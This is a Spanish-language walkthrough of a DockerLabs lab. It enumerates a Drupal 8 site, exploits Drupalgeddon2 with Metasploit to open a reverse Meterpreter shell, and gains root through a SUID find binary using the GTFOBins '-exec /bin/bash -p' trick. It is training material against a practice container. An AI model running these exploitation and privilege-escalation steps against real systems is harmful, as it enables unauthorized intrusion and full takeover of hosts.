---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Facil
VectorInicial: Drupalgeddon2 (RCE)
ServicioInicial: HTTP (Drupal)
PuertoInicial: 80
Credenciales:
Usuarios:
- www-data
- root
Privesc:
- SUID binary (find)
- GTFOBins exploitation
Tecnicas:
- Web Enumeration
- CMS Fingerprinting
- Exploit Known Vulnerability (Drupalgeddon2)
- Remote Code Execution
- SUID Privilege Escalation
Herramientas:
- gomap
- gobuster
- whatweb
- metasploit
- find
Fecha: 2026-04-07
---
<img width="924" height="585" alt="Pasted image 20260407120149" src="https://github.com/user-attachments/assets/0c59464b-6ec1-4c13-827a-fc6651b3e37e" />

En este laboratorio empezaremos con la enumeración de puertos y servicios.

```bash
 settarget 172.17.0.2          
TARGET establecido: 172.17.0.2

 gomap -s -p - $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 172.17.0.2 (65535 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
80      open   http            Apache 2.4.25 (Debian)

Host Exposure Summary
- 172.17.0.2 | open ports: 1 | critical: none | exposure: low

✓ Completed scan in 647ms | hosts: 1 | open ports: 1
```

Solo esta expuesto el puerto `80` para servir web mediante `apache`, veamos que nos encontramos.

Lo primero que nos encontramos es la pagina por defecto de **Apache**, tendremos que enumerar directorios para que contra que nos enfrentamos.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
drupal               (Status: 301) [Size: 309] [--> http://172.17.0.2/drupal/]
server-status        (Status: 403) [Size: 298]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Parece que estamos antes una web con el `cms` de `Drupal` así que vamos a comprobarlo con alguna herramienta.

```bash
 whatweb http://$TARGET/drupal/
http://172.17.0.2/drupal/ [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

De esta enumeración sacamos:
- Apache 2.4.25
- Drupal 8
- PHP 7.2.3

Necesitamos ser un poco mas exactos con la versión de `Drupal` para así poder afinar la búsqueda de una vulnerabilidad o exploit.

Vamos a usar la herramienta `Metasploit Framework` para esta ocasión.

```bash
msf > search drupal

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .
   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .
   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .
   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .
   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .
   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .
   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .
   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .
   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .
   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .
   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .
   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .
   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .
   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval
```

Como podemos ver en la lista nos encontramos con varios `exploits` y `auxiliary` para hacer varias cosas con `Drupal`.

Como nuestro **Drupal** es la versión **8** usaremos el `exploit` marcado como 1, así que usaremos el comando `use 1` para seleccionarlo y después `show options` para ver los parámetros que tenemos que configurar.

```bash
msf exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 172.17.0.2
rhost => 172.17.0.2
msf exploit(unix/webapp/drupal_drupalgeddon2) > set targeturi /drupal/
targeturi => /drupal/
msf exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 172.17.0.1
lhost => 172.17.0.1
```


Con estos parámetros configurados ya estamos listos para lanzar el `exploit`.

> [!note] Cabe destacar en parámetro `TARGETURI` ya que determina donde se encuentra **Drupal** ya que por defecto esta designado como `/`.

Ahora usaremos el comando `exploit` para ejecutar y esperar a que nos proporcione una `revershell`.

```bash
msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (42137 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:54566) at 2026-04-07 15:45:48 +0200

meterpreter > 
```

Como podemos ver ya tenemos una consola en la maquina objetivo aprovechando `Drupalgeddon 2` que es una vulnerabilidad que afecta a este `cms` desde hace tiempo.

```bash
meterpreter > shell
Process 41 created.
Channel 0 created.
pwd 
/var/www/html/drupal
whoami
www-data
```

Como podemos ver estamos conectados como `www-data` así que tendremos que buscar permisos en la carpeta actual para ver si podemos reutilizarlos.

```bash
find . -name settings.php 2>/dev/null
./sites/default/settings.php
cat ./sites/default/settings.php
<?php

// @codingStandardsIgnoreFile

/**
 * @file
 * Drupal site-specific configuration file.

<skip>

 *   $settings['hash_salt'] = file_get_contents('/home/example/salt.txt');
 * @endcode
 */
$settings['hash_salt'] = 'uBEGMYLcuSjIMRM1pENikjlmbYFEryEyQQ9RqyCpqk36iElxl8I0yZdzB5EmVpdIxsdW8s_7BA';

/**
 * Deployment identifier.

<skip>
```

Parece que no encontramos nada interesante por este lado.

Pondremos la terminal un poco mas interactiva.

```bash
/bin/bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@690ec50a3ec6:/var/www/html/drupal$ export TERM=xterm
export TERM=xterm
www-data@690ec50a3ec6:/var/www/html/drupal$
```

Parece que nuestro primer intento de buscar acceso ha fallado.

```bash
www-data@690ec50a3ec6:/var/www/html/drupal$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```

Tendremos que buscar directamente a ver si tenemos `SUID`.

```bash
www-data@690ec50a3ec6:/var/www/html/drupal$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/find
/usr/bin/chfn
/usr/bin/sudo
```

Parece que el propio `find` sera nuestra puerta de acceso a `root`, veamos que dice [GTFOBins](https://gtfobins.org/gtfobins/find/).

```bash
www-data@690ec50a3ec6:/var/www/html/drupal$ find . -exec /bin/bash -p \; -quit
<www/html/drupal$ find . -exec /bin/bash -p \; -quit
whoami
root
ls /root
secretitomaximo.txt
cat /root/secretitomaximo.txt
nobodycanfindthispasswordrootrocks
```

Y con esto hemos terminado este laboratorio de `Drupal` que ha sido bastante fácil la verdad, pero siempre hay que indagar y buscar antes de dar por echo un descubrimiento o ir directamente al grano, nunca se sabe lo que uno puede encontrar.
